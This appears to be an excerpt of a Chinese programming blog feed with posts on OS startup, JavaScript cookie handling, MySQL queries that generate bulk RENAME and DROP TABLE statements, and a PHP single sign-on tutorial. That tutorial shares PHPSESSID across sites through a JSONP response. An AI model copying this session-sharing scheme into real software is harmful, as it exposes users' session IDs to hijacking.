<h2 id="十、操作系统的启动流程"><a href="#十、操作系统的启动流程" class="headerlink" title="十、操作系统的启动流程"></a>十、操作系统的启动流程</h2><ol>
<li><p>机器加电，bios 启动检查硬件设备。</p>
</li>
<li><p>bios 读取 COMS 中存储的参数，选择启动设备。</p>
</li>
<li><p>从启动设备中读取第一个扇区的内容。</p>
</li>
<li><p>根据分区信息读入 bootloader 启动装载模块，启动操作系统。</p>
</li>
<li><p>操作系统文件会从 bios 中获取配置参数。会检查计算机设备的驱动程序，如果有设备缺少会提示用户缺少驱动，如果全动加载成功，则操作系统会将他们加入到内核中。</p>
</li>
</ol>
<h2 id="十一、应用程序的启动流程"><a href="#十一、应用程序的启动流程" class="headerlink" title="十一、应用程序的启动流程"></a>十一、应用程序的启动流程</h2><ol>
<li><p>输入设备将指令发给控制器。</p>
</li>
<li><p>控制器通过驱动器将请求发给操作系统。</p>
</li>
<li><p>操作系统会去硬盘上寻找文件位置。</p>
</li>
<li><p>操作系统找到文件以后会往内存里读，读完以后程序启动成功。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>使用 JS 设置和删除 Cookie</title>
    <url>/2018/09/javascript-cookie/</url>
    <content><![CDATA[<h2 id="JS-设置-Cookie-有很多种方法。"><a href="#JS-设置-Cookie-有很多种方法。" class="headerlink" title="JS 设置 Cookie 有很多种方法。"></a>JS 设置 Cookie 有很多种方法。</h2><h2 id="第一种：（这个是w3c官网的代码）"><a href="#第一种：（这个是w3c官网的代码）" class="headerlink" title="第一种：（这个是w3c官网的代码）"></a>第一种：（这个是w3c官网的代码）</h2><span id="more"></span>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">cname, cvalue, exdays</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    d.<span class="title function_">setTime</span>(d.<span class="title function_">getTime</span>() + (exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">var</span> expires = <span class="string">&quot;expires=&quot;</span>+d.<span class="title function_">toUTCString</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">cookie</span> = cname + <span class="string">&quot;=&quot;</span> + cvalue + <span class="string">&quot;; &quot;</span> + expires;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取cookie</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">cname</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ca.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i];</span><br><span class="line">        <span class="keyword">while</span> (c.<span class="title function_">charAt</span>(<span class="number">0</span>)==<span class="string">&#x27; &#x27;</span>) c = c.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c.<span class="title function_">indexOf</span>(name) != -<span class="number">1</span>) <span class="keyword">return</span> c.<span class="title function_">substring</span>(name.<span class="property">length</span>, c.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//清除cookie  </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clearCookie</span>(<span class="params">name</span>) &#123;  </span><br><span class="line">    <span class="title function_">setCookie</span>(name, <span class="string">&quot;&quot;</span>, -<span class="number">1</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkCookie</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> user = <span class="title function_">getCookie</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Welcome again &quot;</span> + user);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="title function_">prompt</span>(<span class="string">&quot;Please enter your name:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="string">&quot;&quot;</span> &amp;&amp; user != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="title function_">setCookie</span>(<span class="string">&quot;username&quot;</span>, user, <span class="number">365</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">checkCookie</span>(); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">//JS操作cookies方法!</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//写cookies</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">c_name, value, expiredays</span>)&#123;</span><br><span class="line"> 　　　　<span class="keyword">var</span> exdate=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">　　　　exdate.<span class="title function_">setDate</span>(exdate.<span class="title function_">getDate</span>() + expiredays);</span><br><span class="line">　　　　<span class="variable language_">document</span>.<span class="property">cookie</span>=c_name+ <span class="string">&quot;=&quot;</span> + <span class="built_in">escape</span>(value) + ((expiredays==<span class="literal">null</span>) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;;expires=&quot;</span>+exdate.<span class="title function_">toGMTString</span>());</span><br><span class="line"> 　　&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//读取cookies</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">name</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arr,reg=<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(^| )&quot;</span>+name+<span class="string">&quot;=([^;]*)(;|$)&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(arr=<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">match</span>(reg))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> (arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//删除cookies</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delCookie</span>(<span class="params">name</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    exp.<span class="title function_">setTime</span>(exp.<span class="title function_">getTime</span>() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> cval=<span class="title function_">getCookie</span>(name);</span><br><span class="line">    <span class="keyword">if</span>(cval!=<span class="literal">null</span>)</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">cookie</span>= name + <span class="string">&quot;=&quot;</span>+cval+<span class="string">&quot;;expires=&quot;</span>+exp.<span class="title function_">toGMTString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用示例</span></span><br><span class="line"><span class="title function_">setCookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;Darren&#x27;</span>,<span class="number">30</span>) </span><br><span class="line"><span class="title function_">alert</span>(<span class="title function_">getCookie</span>(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第三个例子"><a href="#第三个例子" class="headerlink" title="第三个例子"></a>第三个例子</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JavaScript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">addCookie</span>(<span class="params">objName, objValue, objHours</span>)&#123;<span class="comment">//添加cookie </span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> str = objName + <span class="string">&quot;=&quot;</span> + <span class="built_in">escape</span>(objValue); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (objHours &gt; <span class="number">0</span>) &#123;<span class="comment">//为0时不设定过期时间，浏览器关闭时cookie自动消失 </span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(); </span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> ms = objHours * <span class="number">3600</span> * <span class="number">1000</span>; </span></span><br><span class="line"><span class="language-javascript">                    date.<span class="title function_">setTime</span>(date.<span class="title function_">getTime</span>() + ms); </span></span><br><span class="line"><span class="language-javascript">                    str += <span class="string">&quot;; expires=&quot;</span> + date.<span class="title function_">toGMTString</span>(); </span></span><br><span class="line"><span class="language-javascript">                &#125; </span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">cookie</span> = str; </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;添加cookie成功&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">objName</span>)&#123;<span class="comment">//获取指定名称的cookie的值 </span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> arrStr = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;; &quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrStr.<span class="property">length</span>; i++) &#123; </span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> temp = arrStr[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (temp[<span class="number">0</span>] == objName) </span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">return</span> <span class="built_in">unescape</span>(temp[<span class="number">1</span>]); </span></span><br><span class="line"><span class="language-javascript">                &#125; </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">delCookie</span>(<span class="params">name</span>)&#123;<span class="comment">//为了删除指定名称的cookie，可以将其过期时间设定为一个过去的时间 </span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(); </span></span><br><span class="line"><span class="language-javascript">                date.<span class="title function_">setTime</span>(date.<span class="title function_">getTime</span>() - <span class="number">10000</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">cookie</span> = name + <span class="string">&quot;=a; expires=&quot;</span> + date.<span class="title function_">toGMTString</span>(); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">allCookie</span>(<span class="params"></span>)&#123;<span class="comment">//读取所有保存的cookie字符串 </span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="property">cookie</span>; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (str == <span class="string">&quot;&quot;</span>) &#123; </span></span><br><span class="line"><span class="language-javascript">                    str = <span class="string">&quot;没有保存任何cookie&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">                &#125; </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(str); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">m, n</span>)&#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">forms</span>[m].<span class="property">elements</span>[n].<span class="property">value</span>; </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">add_</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_name = $(<span class="string">&quot;myform&quot;</span>, <span class="string">&quot;cookie_name&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_value = $(<span class="string">&quot;myform&quot;</span>, <span class="string">&quot;cookie_value&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_expireHours = $(<span class="string">&quot;myform&quot;</span>, <span class="string">&quot;cookie_expiresHours&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">addCookie</span>(cookie_name, cookie_value, cookie_expireHours); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">get_</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_name = $(<span class="string">&quot;myform&quot;</span>, <span class="string">&quot;cookie_name&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_value = <span class="title function_">getCookie</span>(cookie_name); </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(cookie_value); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">del_</span>(<span class="params"></span>)&#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> cookie_name = $(<span class="string">&quot;myform&quot;</span>, <span class="string">&quot;cookie_name&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">delCookie</span>(cookie_name); </span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;删除成功&quot;</span>); </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;myform&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;cookie_name&quot;</span>&gt;</span> </span><br><span class="line">                    名称 </span><br><span class="line">                <span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cookie_name&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;cookie_value&quot;</span>&gt;</span> </span><br><span class="line">                值 </span><br><span class="line">                <span class="tag">&lt;/<span class="name">lable</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cookie_value&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;cookie_expireHours&quot;</span>&gt;</span> </span><br><span class="line">                多少个小时过期 </span><br><span class="line">                <span class="tag">&lt;/<span class="name">lable</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cookie_expiresHours&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;添加该cookie&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;add_()&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;读取所有cookie&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;allCookie()&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;读取该名称cookie&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;get_()&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;删除该名称cookie&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;del_()&quot;</span>/&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>chrome浏览器在本地获取不到cookie。必须在服务器上才可以。如果是本地的话，你可以放到local的www目录下面。</p>
<p>Google Chrome只支持在线网站的cookie的读写操作，对本地html的cookie操作是禁止的。所以下面的代码如果你写在一个本地的html文件中，将弹出的对话框内容为空。</p>
<p>document.cookie &#x3D; “Test&#x3D;cooo”;<br>alert(document.cookie);</p>
<p>如果这个页面是在线网站的内容，则会正常显示cookie内容Test&#x3D;cooo等等。</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 批量操作数据表 SQL 语句</title>
    <url>/2018/09/mysql-batch/</url>
    <content><![CDATA[<h2 id="流程，先打印出-SQL-语句，然后再-MySQL-中执行！"><a href="#流程，先打印出-SQL-语句，然后再-MySQL-中执行！" class="headerlink" title="流程，先打印出 SQL 语句，然后再 MySQL 中执行！"></a>流程，先打印出 SQL 语句，然后再 MySQL 中执行！</h2><h2 id="1，批量修改表前缀"><a href="#1，批量修改表前缀" class="headerlink" title="1，批量修改表前缀"></a>1，批量修改表前缀</h2><span id="more"></span>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    CONCAT(</span><br><span class="line">        <span class="string">&#x27;ALTER TABLE &#x27;</span>,</span><br><span class="line">        table_name,</span><br><span class="line">        <span class="string">&#x27; RENAME TO db_&#x27;</span>,</span><br><span class="line">        <span class="built_in">substring</span>(table_name, <span class="number">4</span>),</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    information_schema. TABLES</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    table_name <span class="keyword">LIKE</span> <span class="string">&#x27;ct%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="2，批量删除表"><a href="#2，批量删除表" class="headerlink" title="2，批量删除表!"></a>2，批量删除表!</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    CONCAT(</span><br><span class="line">        <span class="string">&#x27;drop table &#x27;</span>,</span><br><span class="line">        table_name,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    information_schema. TABLES</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    table_name <span class="keyword">LIKE</span> <span class="string">&#x27;uc_%&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>SSO单点登录PHP简单版</title>
    <url>/2018/09/php-sso/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前面做了一个新项目，需要用户资源可以需要共享。由于之前没有做过这样的东西，回家之后，立马网站百度“单点登录”。帖子很多，甄别之后，这里列几篇认为比较有营养。</p>
<p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXUvYXJ0aWNsZS9kZXRhaWxzLzIwNTQ1NTEz">http://blog.csdn.net/ghsau/article/details/20545513<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<p>如果要解决两个网站之间的同步登录（单点登录）问题，首先来看看一个网站的登录问题。</p>
<p>很多人知道一个网站的登录问题，PHP不就是把通过 <code>$_SESSION[&#39;user&#39;]=array(&#39;username&#39;=&gt;&#39;user1&#39;);</code> 那么，看看php的一句代码，做了那些操作。</p>
<p>以windows下wamp环境配合php的配置文件php.ini看瞧瞧session的相关知识？</p>
<p>php中默认提供session处理方案，可以在php.ini配置文件中看到有这么两行，</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.save_handler</span>=file</span><br><span class="line"></span><br><span class="line"><span class="attr">session.save_path</span> = <span class="string">&quot;E:/wamp/tmp&quot;</span>,如下图</span><br></pre></td></tr></table></figure>

<p>这两句告诉我们，在php中session的处理是文件files的方式，存储的地方是E:&#x2F;wamp&#x2F;tmp,看看我的文件目录下去。</p>
<hr>
<p>好啦，这就是传说中的session，看得见，摸得着。可以用记事本打开下,可以看到是一些字符，这是php对象数组序列化之后的字符串。就是把session对象序列化之后，写到文件中，达到session的持久化。如果采用默认配置的话，多个网站的session文件都是存在一个地方的。也就是说，如果同一台服务器中，有两个网站，网站a和网站b的session文件都会存储在一个地方，session文件都有自己的唯一标示符，sessionID。sessionID的生成，sessionID是唯一的，这个sessionID跟session的持久化文件名称是对应的。php通过sessionID去获取session文件，反序列化出来，就能达到session读取的功能了。这样的话，会不会想到，如果两个sessionID相同的话，用户在网站a登录了，用户在去访问网站b的时候，如果sessionID相同，就是已经的登录的状态了。</p>
<p>解决：两个网站sessionID相同思路</p>
<p>php提供了session_id()这个函数可以获取到sessionID，可以设置sessionID。在原生PHP中，能实现通过session_id()去修改sessionID，在一些框架中比较难实现，需要深究框架代码，为何难实现呢，这里要了解session_id()和session_start()一些关联了，需要先设定sessionID之后，再去session_start()。所以在框架中，会自动的启用session_start()，所以在启动之后再去修改，sessionID未被修改。</p>
<p>sessionID相同的还有一种方式，就是浏览器修改sessionID，sessionID是存储在cookie中，在配置文件中，可以看到session.name &#x3D; PHPSESSID，那么这个PHPSESSID就是sessionID在cookie中的name了。</p>
<hr>
<p>浏览器和服务器之间每次交互，这个cookie值都会传递给服务器，所以如果我们前台去修改这个值的话，就可以让两个网站公用一个sessionID的值了。</p>
<p>具体实施：在网站b所有的页面用户加载的时候，去请求网站a的一个接口，看看用户是否有登录，如果有的话，就放回sessionID给网站b，网站b接受到sessionID之后，就修改浏览器cookie中的PHPSESSID值。这样网站b的用户再去操作的话，就会发现自己sessionID对应的session文件跟网站a是同一个，从而达到同步登录。</p>
<p>网站b代码需要做的就是页面每次访问都需要去请求a网站的数据判断用户是否在a网站登录。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">if</span> <span class="attr">condition</span>=<span class="string">&quot;!session(&#x27;?member&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--未登录--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name,value</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">cookie</span> = name + <span class="string">&quot;=&quot;</span>+ <span class="built_in">escape</span> (value)+<span class="string">&quot;;path=/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//jsonp登录函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonp_do</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//log(&#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    &lt;&#123;~$t=<span class="title function_">time</span>()&#125;&gt;</span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>:<span class="string">&#x27;get&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>:<span class="string">&quot;&lt;&#123;:C(&#x27;SSO_Site&#x27;)&#125;&gt;?_ts=&lt;&#123;$t&#125;&gt;&amp;_token=&lt;&#123;:md5($t.C(&#x27;SecretKey&#x27;))&#125;&gt;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>:<span class="string">&#x27;jsonp&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">crossDomain</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">jsonpCallback</span>:<span class="string">&#x27;jsonp_do&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123; </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(data.<span class="property">error</span>==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">setCookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>,data.<span class="property">sess_id</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;         </span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">XHR, textStatus, errorThrown</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//log</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么网站a就要给出对应的页面来给网站b请求且返回数据。</p>
